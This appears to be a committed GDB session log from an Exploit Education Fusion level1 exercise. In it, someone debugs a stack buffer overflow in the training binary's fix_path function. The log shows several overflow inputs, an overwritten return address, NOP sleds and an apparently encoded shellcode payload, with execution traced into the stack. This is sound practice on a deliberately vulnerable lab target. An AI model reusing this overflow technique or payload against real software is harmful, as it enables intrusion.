+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049f14 <+77>:	leave  
+   0x08049f15 <+78>:	ret    
+End of assembler dump.
+Breakpoint 2 at 0x8049f15
+Continuing.
+
+Breakpoint 2, 0x08049f15 in fix_path ()
+0x0807c17c in _dl_get_tls_static_info ()
+0x0807c17d in _dl_get_tls_static_info ()
+0xffffcb30 in ?? ()
+Dump of assembler code from 0xffffcb30 to 0xa:
+End of assembler dump.
+Dump of assembler code from 0xffffcb30 to 0xffffcb3a:
+=> 0xffffcb30:	nop
+   0xffffcb31:	nop
+   0xffffcb32:	nop
+   0xffffcb33:	nop
+   0xffffcb34:	nop
+   0xffffcb35:	nop
+   0xffffcb36:	nop
+   0xffffcb37:	nop
+   0xffffcb38:	jmp    0xffffcb38
+End of assembler dump.
+Breakpoint 3 at 0xffffcb38
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffcb30 in ?? ()
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+   0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049f14 <+77>:	leave  
+   0x08049f15 <+78>:	ret    
+End of assembler dump.
+No function contains specified address.
+No function contains specified address.
+Breakpoint 1 at 0x8049f09
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\|¡êêêêêêêêÎ˛Î˛\ HTTP/1.1
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffcb10 in ?? ()
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\|¡êêêêêêêêÎ˛Î˛\ HTTP/1.1
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffcb10 in ?? ()
+Breakpoint 2 at 0x8049ecb
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\|¡êêêêêêêêÎ˛Î˛\ HTTP/1.1
+
+Breakpoint 2, 0x08049ecb in fix_path ()
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+=> 0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049f14 <+77>:	leave  
+   0x08049f15 <+78>:	ret    
+End of assembler dump.
+0x08049ed1 in fix_path ()
+0x08049d70 in __x86.get_pc_thunk.bx ()
+0x08049d73 in __x86.get_pc_thunk.bx ()
+0x08049ed6 in fix_path ()
+0x08049edc in fix_path ()
+0x08049edf in fix_path ()
+0x08049ee5 in fix_path ()
+0x08049ee6 in fix_path ()
+0x08049ee9 in fix_path ()
+0x08049eee in fix_path ()
+0x08049ef1 in fix_path ()
+0x08049ef3 in fix_path ()
+0x08049ef5 in fix_path ()
+0x08049efa in fix_path ()
+0x08049f11 in fix_path ()
+0x08049f14 in fix_path ()
+Undefined command: "exit".  Try "help".
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\|¡êêêêêêêêÎ˛Î˛\ HTTP/1.1
+
+Program received signal SIGINT, Interrupt.
+0xffffcb18 in ?? ()
+Reading symbols from ./target...
+(No debugging symbols found in ./target)
+Breakpoint 1 at 0x8049ecb
+Starting program: /home/x90slide/exercises/exploit_education/fusion/level1/local/target GET\ /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\|¡ÎN\ HTTP/1.1\ êêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêªD—›«Ÿt\$Ù\]1…±1\]É≈ﬂÔËêÒÅ˘¥ú\'w€—AJúÅ‘‰¢hfM§ãé˛jœf˝r–6àí\^–⁄ÕÆÿ,\^\|∫pÚRe†€¿7¿VåŒÊÊ9h
+
+Breakpoint 1, 0x08049ecb in fix_path ()
+Dump of assembler code for function fix_path:
+   0x08049ec7 <+0>:	push   ebp
+   0x08049ec8 <+1>:	mov    ebp,esp
+   0x08049eca <+3>:	push   ebx
+=> 0x08049ecb <+4>:	sub    esp,0x84
+   0x08049ed1 <+10>:	call   0x8049d70 <__x86.get_pc_thunk.bx>
+   0x08049ed6 <+15>:	add    ebx,0xa112a
+   0x08049edc <+21>:	sub    esp,0x8
+   0x08049edf <+24>:	lea    eax,[ebp-0x88]
+   0x08049ee5 <+30>:	push   eax
+   0x08049ee6 <+31>:	push   DWORD PTR [ebp+0x8]
+   0x08049ee9 <+34>:	call   0x8051110 <realpath>
+   0x08049eee <+39>:	add    esp,0x10
+   0x08049ef1 <+42>:	test   eax,eax
+   0x08049ef3 <+44>:	jne    0x8049efc <fix_path+53>
+   0x08049ef5 <+46>:	mov    eax,0x1
+   0x08049efa <+51>:	jmp    0x8049f11 <fix_path+74>
+   0x08049efc <+53>:	sub    esp,0x8
+   0x08049eff <+56>:	lea    eax,[ebp-0x88]
+   0x08049f05 <+62>:	push   eax
+   0x08049f06 <+63>:	push   DWORD PTR [ebp+0x8]
+   0x08049f09 <+66>:	call   0x8049020
+   0x08049f0e <+71>:	add    esp,0x10
+   0x08049f11 <+74>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049f14 <+77>:	leave  
+   0x08049f15 <+78>:	ret    
+End of assembler dump.
+Breakpoint 2 at 0x8049f15
+0x08049ed1 in fix_path ()
+0x08049d70 in __x86.get_pc_thunk.bx ()
+0x08049d73 in __x86.get_pc_thunk.bx ()
+0x08049ed6 in fix_path ()
+Continuing.
+
+Breakpoint 2, 0x08049f15 in fix_path ()
+0x0807c17c in _dl_get_tls_static_info ()
+0x0807c17d in _dl_get_tls_static_info ()
+0xffffca70 in ?? ()
+Dump of assembler code from 0xffffca70 to 0xffffca7a:
+=> 0xffffca70:	jmp    0xffffcac0
+   0xffffca72:	add    bh,bh
+   0xffffca74:	popa   
+   0xffffca75:	jo     0xffffca82
+   0xffffca77:	or     BYTE PTR [eax],cl
+   0xffffca79:	add    BYTE PTR [eax],al
+End of assembler dump.
+0xffffcac0 in ?? ()
+Dump of assembler code from 0xffffcac0 to 0xffffcaca:
+=> 0xffffcac0:	inc    ecx
+   0xffffcac1:	inc    ecx
+   0xffffcac2:	inc    ecx
+   0xffffcac3:	inc    ecx
+   0xffffcac4:	inc    ecx
+   0xffffcac5:	inc    ecx
+   0xffffcac6:	inc    ecx
+   0xffffcac7:	inc    ecx
+   0xffffcac8:	inc    ecx
+   0xffffcac9:	inc    ecx
+End of assembler dump.
+Dump of assembler code from 0xffffcac0 to 0xffffcb24:
+=> 0xffffcac0:	inc    ecx
+   0xffffcac1:	inc    ecx
+   0xffffcac2:	inc    ecx
+   0xffffcac3:	inc    ecx
+   0xffffcac4:	inc    ecx
+   0xffffcac5:	inc    ecx
+   0xffffcac6:	inc    ecx
+   0xffffcac7:	inc    ecx
+   0xffffcac8:	inc    ecx
+   0xffffcac9:	inc    ecx
+   0xffffcaca:	inc    ecx
+   0xffffcacb:	inc    ecx
+   0xffffcacc:	inc    ecx
+   0xffffcacd:	inc    ecx
+   0xffffcace:	inc    ecx
+   0xffffcacf:	inc    ecx
+   0xffffcad0:	inc    ecx
+   0xffffcad1:	inc    ecx
+   0xffffcad2:	inc    ecx
+   0xffffcad3:	inc    ecx
+   0xffffcad4:	inc    ecx
+   0xffffcad5:	inc    ecx
+   0xffffcad6:	inc    ecx
+   0xffffcad7:	inc    ecx
+   0xffffcad8:	inc    ecx
+   0xffffcad9:	inc    ecx
+   0xffffcada:	inc    ecx
+   0xffffcadb:	inc    ecx
+   0xffffcadc:	inc    ecx
+   0xffffcadd:	inc    ecx
+   0xffffcade:	inc    ecx
+   0xffffcadf:	inc    ecx
+   0xffffcae0:	inc    ecx
+   0xffffcae1:	inc    ecx
+   0xffffcae2:	inc    ecx
+   0xffffcae3:	inc    ecx
+   0xffffcae4:	inc    ecx
+   0xffffcae5:	inc    ecx
+   0xffffcae6:	inc    ecx
+   0xffffcae7:	inc    ecx
+   0xffffcae8:	inc    ecx
+   0xffffcae9:	inc    ecx
+Quit
+Dump of assembler code from 0xffffca70 to 0xffffcad4:
+   0xffffca70:	jmp    0xffffcac0
+   0xffffca72:	add    bh,bh
+   0xffffca74:	popa   
+   0xffffca75:	jo     0xffffca82
+   0xffffca77:	or     BYTE PTR [eax],cl
+   0xffffca79:	add    BYTE PTR [eax],al
+   0xffffca7b:	add    BYTE PTR ds:0x8049f,ah
+   0xffffca81:	add    BYTE PTR [eax],al
+   0xffffca83:	add    BYTE PTR [eax],al
+   0xffffca85:	add    BYTE PTR [eax],al
+   0xffffca87:	add    BYTE PTR [edi+0x45],al
+   0xffffca8a:	push   esp
+   0xffffca8b:	and    BYTE PTR [edi],ch
+   0xffffca8d:	inc    ecx
+   0xffffca8e:	inc    ecx
+   0xffffca8f:	inc    ecx
+   0xffffca90:	inc    ecx
+   0xffffca91:	inc    ecx
+   0xffffca92:	inc    ecx
+   0xffffca93:	inc    ecx
+   0xffffca94:	inc    ecx
+   0xffffca95:	inc    ecx
+   0xffffca96:	inc    ecx
+   0xffffca97:	inc    ecx
+   0xffffca98:	inc    ecx
+   0xffffca99:	inc    ecx
+   0xffffca9a:	inc    ecx
+   0xffffca9b:	inc    ecx
+   0xffffca9c:	inc    ecx
+   0xffffca9d:	inc    ecx
+   0xffffca9e:	inc    ecx
+   0xffffca9f:	inc    ecx
+   0xffffcaa0:	inc    ecx
+   0xffffcaa1:	inc    ecx
+   0xffffcaa2:	inc    ecx
+   0xffffcaa3:	inc    ecx
+   0xffffcaa4:	inc    ecx
+   0xffffcaa5:	inc    ecx
+   0xffffcaa6:	inc    ecx
+   0xffffcaa7:	inc    ecx
+   0xffffcaa8:	inc    ecx
+   0xffffcaa9:	inc    ecx
+   0xffffcaaa:	inc    ecx
+   0xffffcaab:	inc    ecx
+   0xffffcaac:	inc    ecx
+   0xffffcaad:	inc    ecx
+   0xffffcaae:	inc    ecx
+   0xffffcaaf:	inc    ecx
+   0xffffcab0:	inc    ecx
+   0xffffcab1:	inc    ecx
+   0xffffcab2:	inc    ecx
+   0xffffcab3:	inc    ecx
+   0xffffcab4:	inc    ecx
+   0xffffcab5:	inc    ecx
+   0xffffcab6:	inc    ecx
+   0xffffcab7:	inc    ecx
+   0xffffcab8:	inc    ecx
+   0xffffcab9:	inc    ecx
+   0xffffcaba:	inc    ecx
+   0xffffcabb:	inc    ecx
+   0xffffcabc:	inc    ecx
+   0xffffcabd:	inc    ecx
+   0xffffcabe:	inc    ecx
+   0xffffcabf:	inc    ecx
+=> 0xffffcac0:	inc    ecx
+   0xffffcac1:	inc    ecx
+   0xffffcac2:	inc    ecx
+   0xffffcac3:	inc    ecx
+   0xffffcac4:	inc    ecx
+   0xffffcac5:	inc    ecx
+   0xffffcac6:	inc    ecx
+   0xffffcac7:	inc    ecx
+   0xffffcac8:	inc    ecx
+   0xffffcac9:	inc    ecx
+   0xffffcaca:	inc    ecx
+   0xffffcacb:	inc    ecx
+   0xffffcacc:	inc    ecx
+   0xffffcacd:	inc    ecx
+   0xffffcace:	inc    ecx
+   0xffffcacf:	inc    ecx
+   0xffffcad0:	inc    ecx
+   0xffffcad1:	inc    ecx
+   0xffffcad2:	inc    ecx
+   0xffffcad3:	inc    ecx
+End of assembler dump.
+Dump of assembler code from 0xffffca70 to 0xffffcb38:
+   0xffffca70:	jmp    0xffffcac0
+   0xffffca72:	add    bh,bh
+   0xffffca74:	popa   
+   0xffffca75:	jo     0xffffca82
+   0xffffca77:	or     BYTE PTR [eax],cl
+   0xffffca79:	add    BYTE PTR [eax],al
+   0xffffca7b:	add    BYTE PTR ds:0x8049f,ah
+   0xffffca81:	add    BYTE PTR [eax],al
+   0xffffca83:	add    BYTE PTR [eax],al
+   0xffffca85:	add    BYTE PTR [eax],al
+   0xffffca87:	add    BYTE PTR [edi+0x45],al
+   0xffffca8a:	push   esp
+   0xffffca8b:	and    BYTE PTR [edi],ch
+   0xffffca8d:	inc    ecx
+   0xffffca8e:	inc    ecx
+   0xffffca8f:	inc    ecx
+   0xffffca90:	inc    ecx
+   0xffffca91:	inc    ecx
+   0xffffca92:	inc    ecx
+   0xffffca93:	inc    ecx
+   0xffffca94:	inc    ecx
+   0xffffca95:	inc    ecx
+   0xffffca96:	inc    ecx
+   0xffffca97:	inc    ecx
+   0xffffca98:	inc    ecx
+   0xffffca99:	inc    ecx
+   0xffffca9a:	inc    ecx
+   0xffffca9b:	inc    ecx
+   0xffffca9c:	inc    ecx
+   0xffffca9d:	inc    ecx
+   0xffffca9e:	inc    ecx
+   0xffffca9f:	inc    ecx
+   0xffffcaa0:	inc    ecx
+   0xffffcaa1:	inc    ecx
+   0xffffcaa2:	inc    ecx
+   0xffffcaa3:	inc    ecx
+   0xffffcaa4:	inc    ecx
+   0xffffcaa5:	inc    ecx
+   0xffffcaa6:	inc    ecx
+   0xffffcaa7:	inc    ecx
+   0xffffcaa8:	inc    ecx
+   0xffffcaa9:	inc    ecx
+   0xffffcaaa:	inc    ecx
+   0xffffcaab:	inc    ecx
+   0xffffcaac:	inc    ecx
+   0xffffcaad:	inc    ecx
+   0xffffcaae:	inc    ecx
+   0xffffcaaf:	inc    ecx
+   0xffffcab0:	inc    ecx
+   0xffffcab1:	inc    ecx
+   0xffffcab2:	inc    ecx
+   0xffffcab3:	inc    ecx
+   0xffffcab4:	inc    ecx
+   0xffffcab5:	inc    ecx
+   0xffffcab6:	inc    ecx
+   0xffffcab7:	inc    ecx
+   0xffffcab8:	inc    ecx
+   0xffffcab9:	inc    ecx
+   0xffffcaba:	inc    ecx
+   0xffffcabb:	inc    ecx
+   0xffffcabc:	inc    ecx
+   0xffffcabd:	inc    ecx
+   0xffffcabe:	inc    ecx
+   0xffffcabf:	inc    ecx
+=> 0xffffcac0:	inc    ecx
+   0xffffcac1:	inc    ecx
+   0xffffcac2:	inc    ecx
+   0xffffcac3:	inc    ecx
+   0xffffcac4:	inc    ecx
+   0xffffcac5:	inc    ecx
+   0xffffcac6:	inc    ecx
+   0xffffcac7:	inc    ecx
+   0xffffcac8:	inc    ecx
+   0xffffcac9:	inc    ecx
+   0xffffcaca:	inc    ecx
+   0xffffcacb:	inc    ecx
+   0xffffcacc:	inc    ecx
+   0xffffcacd:	inc    ecx
+   0xffffcace:	inc    ecx
+   0xffffcacf:	inc    ecx
+   0xffffcad0:	inc    ecx
+   0xffffcad1:	inc    ecx
+   0xffffcad2:	inc    ecx
+   0xffffcad3:	inc    ecx
+   0xffffcad4:	inc    ecx
+   0xffffcad5:	inc    ecx
+   0xffffcad6:	inc    ecx
+   0xffffcad7:	inc    ecx
+   0xffffcad8:	inc    ecx
+   0xffffcad9:	inc    ecx
+   0xffffcada:	inc    ecx
+   0xffffcadb:	inc    ecx
+   0xffffcadc:	inc    ecx
+   0xffffcadd:	inc    ecx
+   0xffffcade:	inc    ecx
+   0xffffcadf:	inc    ecx
+   0xffffcae0:	inc    ecx
+   0xffffcae1:	inc    ecx
+   0xffffcae2:	inc    ecx
+   0xffffcae3:	inc    ecx
+   0xffffcae4:	inc    ecx
+   0xffffcae5:	inc    ecx
+   0xffffcae6:	inc    ecx
+   0xffffcae7:	inc    ecx
+   0xffffcae8:	inc    ecx
+   0xffffcae9:	inc    ecx
+   0xffffcaea:	inc    ecx
+   0xffffcaeb:	inc    ecx
+   0xffffcaec:	inc    ecx
+   0xffffcaed:	inc    ecx
+   0xffffcaee:	inc    ecx
+   0xffffcaef:	inc    ecx
+   0xffffcaf0:	inc    ecx
+   0xffffcaf1:	inc    ecx
+   0xffffcaf2:	inc    ecx
+   0xffffcaf3:	inc    ecx
+   0xffffcaf4:	inc    ecx
+   0xffffcaf5:	inc    ecx
+   0xffffcaf6:	inc    ecx
+   0xffffcaf7:	inc    ecx
+   0xffffcaf8:	inc    ecx
+   0xffffcaf9:	inc    ecx
+   0xffffcafa:	inc    ecx
+   0xffffcafb:	inc    ecx
+   0xffffcafc:	inc    ecx
+   0xffffcafd:	inc    ecx
+   0xffffcafe:	inc    ecx
+   0xffffcaff:	inc    ecx
+   0xffffcb00:	inc    ecx
+   0xffffcb01:	inc    ecx
+   0xffffcb02:	inc    ecx
+   0xffffcb03:	inc    ecx
+   0xffffcb04:	inc    ecx
+   0xffffcb05:	inc    ecx
+   0xffffcb06:	inc    ecx
+   0xffffcb07:	inc    ecx
+   0xffffcb08:	inc    ecx
+   0xffffcb09:	inc    ecx
+   0xffffcb0a:	inc    ecx
+   0xffffcb0b:	inc    ecx
+   0xffffcb0c:	inc    ecx
+   0xffffcb0d:	inc    ecx
+   0xffffcb0e:	inc    ecx
+   0xffffcb0f:	inc    ecx
+   0xffffcb10:	inc    ecx
+   0xffffcb11:	inc    ecx
+   0xffffcb12:	inc    ecx
+   0xffffcb13:	inc    ecx
+   0xffffcb14:	inc    ecx
+   0xffffcb15:	inc    ecx
+   0xffffcb16:	inc    ecx
+   0xffffcb17:	inc    ecx
+   0xffffcb18:	jl     0xffffcadb
+   0xffffcb1a:	pop    es
+   0xffffcb1b:	or     bl,ch
+   0xffffcb1d:	dec    esi
+   0xffffcb1e:	add    BYTE PTR [eax+0x54],cl
+   0xffffcb21:	push   esp
+   0xffffcb22:	push   eax
+   0xffffcb23:	das    
+   0xffffcb24:	xor    DWORD PTR [esi],ebp
+   0xffffcb26:	xor    DWORD PTR [eax],esp
+   0xffffcb28:	nop
+   0xffffcb29:	nop
+   0xffffcb2a:	nop
+   0xffffcb2b:	nop
+   0xffffcb2c:	nop
+   0xffffcb2d:	nop
+   0xffffcb2e:	nop
+   0xffffcb2f:	nop
+   0xffffcb30:	nop
+   0xffffcb31:	nop
+   0xffffcb32:	nop
+   0xffffcb33:	nop
+   0xffffcb34:	nop
+   0xffffcb35:	nop
+   0xffffcb36:	nop
+   0xffffcb37:	nop
+End of assembler dump.
+Dump of assembler code from 0xffffca70 to 0xffffcb38:
+   0xffffca70:	jmp    0xffffcac0
+   0xffffca72:	add    bh,bh
+   0xffffca74:	popa   
+   0xffffca75:	jo     0xffffca82
+   0xffffca77:	or     BYTE PTR [eax],cl
+   0xffffca79:	add    BYTE PTR [eax],al
+   0xffffca7b:	add    BYTE PTR ds:0x8049f,ah
+   0xffffca81:	add    BYTE PTR [eax],al
+   0xffffca83:	add    BYTE PTR [eax],al
+   0xffffca85:	add    BYTE PTR [eax],al
+   0xffffca87:	add    BYTE PTR [edi+0x45],al
+   0xffffca8a:	push   esp
+   0xffffca8b:	and    BYTE PTR [edi],ch
+   0xffffca8d:	inc    ecx
+   0xffffca8e:	inc    ecx
+   0xffffca8f:	inc    ecx
+   0xffffca90:	inc    ecx
+   0xffffca91:	inc    ecx
+   0xffffca92:	inc    ecx
+   0xffffca93:	inc    ecx
+   0xffffca94:	inc    ecx
+   0xffffca95:	inc    ecx
+   0xffffca96:	inc    ecx
+   0xffffca97:	inc    ecx
+   0xffffca98:	inc    ecx
+   0xffffca99:	inc    ecx
+   0xffffca9a:	inc    ecx
+   0xffffca9b:	inc    ecx
+   0xffffca9c:	inc    ecx
+   0xffffca9d:	inc    ecx
+   0xffffca9e:	inc    ecx
+   0xffffca9f:	inc    ecx
+   0xffffcaa0:	inc    ecx
+   0xffffcaa1:	inc    ecx
+   0xffffcaa2:	inc    ecx
+   0xffffcaa3:	inc    ecx
+   0xffffcaa4:	inc    ecx
+   0xffffcaa5:	inc    ecx
+   0xffffcaa6:	inc    ecx
+   0xffffcaa7:	inc    ecx
+   0xffffcaa8:	inc    ecx
+   0xffffcaa9:	inc    ecx
+Quit
+Quit
+0xffffca70:	0xff004eeb	0x080b7061	0x00000008	0x08049f25
+0xffffca80:	0x00000000	0x00000000	0x20544547	0x4141412f
+0xffffca90:	0x41414141	0x41414141
+0xffffca70:	0xeb	0x4e	0x00	0xff	0x61	0x70	0x0b	0x08
+0xffffca78:	0x08	0x00
+0xffffca70:	0xeb	0x4e	0x00	0xff	0x61	0x70	0x0b	0x08
+0xffffca78:	0x08	0x00	0x00	0x00	0x25	0x9f	0x04	0x08
+0xffffca80:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffca88:	0x47	0x45	0x54	0x20	0x2f	0x41	0x41	0x41
+0xffffca90:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffca98:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcaa0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcaa8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcab0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcab8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcac0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcac8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xffffcad0:	0x41	0x41	0x41	0x41
+Dump of assembler code from 0xffffca70 to 0xffffcb38:
+   0xffffca70:	jmp    0xffffcac0
+   0xffffca72:	add    bh,bh
+   0xffffca74:	popa   
+   0xffffca75:	jo     0xffffca82
+   0xffffca77:	or     BYTE PTR [eax],cl
+   0xffffca79:	add    BYTE PTR [eax],al
+   0xffffca7b:	add    BYTE PTR ds:0x8049f,ah
+   0xffffca81:	add    BYTE PTR [eax],al
+   0xffffca83:	add    BYTE PTR [eax],al
+   0xffffca85:	add    BYTE PTR [eax],al
+   0xffffca87:	add    BYTE PTR [edi+0x45],al
+   0xffffca8a:	push   esp
+   0xffffca8b:	and    BYTE PTR [edi],ch
+   0xffffca8d:	inc    ecx
+   0xffffca8e:	inc    ecx
+   0xffffca8f:	inc    ecx
+   0xffffca90:	inc    ecx
+   0xffffca91:	inc    ecx
+   0xffffca92:	inc    ecx
+   0xffffca93:	inc    ecx
+   0xffffca94:	inc    ecx
+   0xffffca95:	inc    ecx
+   0xffffca96:	inc    ecx
+   0xffffca97:	inc    ecx
+   0xffffca98:	inc    ecx
+   0xffffca99:	inc    ecx
+   0xffffca9a:	inc    ecx
+   0xffffca9b:	inc    ecx
+   0xffffca9c:	inc    ecx
+   0xffffca9d:	inc    ecx
+   0xffffca9e:	inc    ecx
+   0xffffca9f:	inc    ecx
+   0xffffcaa0:	inc    ecx
+   0xffffcaa1:	inc    ecx
+   0xffffcaa2:	inc    ecx
+   0xffffcaa3:	inc    ecx
+   0xffffcaa4:	inc    ecx
+   0xffffcaa5:	inc    ecx
+   0xffffcaa6:	inc    ecx
+   0xffffcaa7:	inc    ecx
+   0xffffcaa8:	inc    ecx
+   0xffffcaa9:	inc    ecx
+   0xffffcaaa:	inc    ecx
+   0xffffcaab:	inc    ecx
+   0xffffcaac:	inc    ecx
+   0xffffcaad:	inc    ecx
+   0xffffcaae:	inc    ecx
+   0xffffcaaf:	inc    ecx
+   0xffffcab0:	inc    ecx
+   0xffffcab1:	inc    ecx
+   0xffffcab2:	inc    ecx
+   0xffffcab3:	inc    ecx
+   0xffffcab4:	inc    ecx
+   0xffffcab5:	inc    ecx
+   0xffffcab6:	inc    ecx
+   0xffffcab7:	inc    ecx
+   0xffffcab8:	inc    ecx
+   0xffffcab9:	inc    ecx
+   0xffffcaba:	inc    ecx
+   0xffffcabb:	inc    ecx
+   0xffffcabc:	inc    ecx
+   0xffffcabd:	inc    ecx
+   0xffffcabe:	inc    ecx
+   0xffffcabf:	inc    ecx
+=> 0xffffcac0:	inc    ecx
+   0xffffcac1:	inc    ecx
+   0xffffcac2:	inc    ecx
+   0xffffcac3:	inc    ecx
+   0xffffcac4:	inc    ecx
+   0xffffcac5:	inc    ecx
+   0xffffcac6:	inc    ecx
+   0xffffcac7:	inc    ecx
+   0xffffcac8:	inc    ecx
+   0xffffcac9:	inc    ecx
+   0xffffcaca:	inc    ecx
+   0xffffcacb:	inc    ecx
+   0xffffcacc:	inc    ecx
+   0xffffcacd:	inc    ecx
+   0xffffcace:	inc    ecx
+   0xffffcacf:	inc    ecx
+   0xffffcad0:	inc    ecx
+   0xffffcad1:	inc    ecx
+   0xffffcad2:	inc    ecx
+   0xffffcad3:	inc    ecx
+   0xffffcad4:	inc    ecx
+   0xffffcad5:	inc    ecx
+   0xffffcad6:	inc    ecx
+   0xffffcad7:	inc    ecx
+   0xffffcad8:	inc    ecx
+   0xffffcad9:	inc    ecx
+   0xffffcada:	inc    ecx
+   0xffffcadb:	inc    ecx
+   0xffffcadc:	inc    ecx
+   0xffffcadd:	inc    ecx
+   0xffffcade:	inc    ecx
+   0xffffcadf:	inc    ecx
+   0xffffcae0:	inc    ecx
+   0xffffcae1:	inc    ecx
+   0xffffcae2:	inc    ecx
+   0xffffcae3:	inc    ecx
+   0xffffcae4:	inc    ecx
+   0xffffcae5:	inc    ecx
+   0xffffcae6:	inc    ecx
+   0xffffcae7:	inc    ecx
+   0xffffcae8:	inc    ecx
+   0xffffcae9:	inc    ecx
+   0xffffcaea:	inc    ecx
+   0xffffcaeb:	inc    ecx
+   0xffffcaec:	inc    ecx
+   0xffffcaed:	inc    ecx
+   0xffffcaee:	inc    ecx
+   0xffffcaef:	inc    ecx
+   0xffffcaf0:	inc    ecx
+   0xffffcaf1:	inc    ecx
+   0xffffcaf2:	inc    ecx
+   0xffffcaf3:	inc    ecx
+   0xffffcaf4:	inc    ecx
+   0xffffcaf5:	inc    ecx
+   0xffffcaf6:	inc    ecx
+   0xffffcaf7:	inc    ecx
+   0xffffcaf8:	inc    ecx
+   0xffffcaf9:	inc    ecx
+   0xffffcafa:	inc    ecx
+   0xffffcafb:	inc    ecx
+   0xffffcafc:	inc    ecx
+   0xffffcafd:	inc    ecx
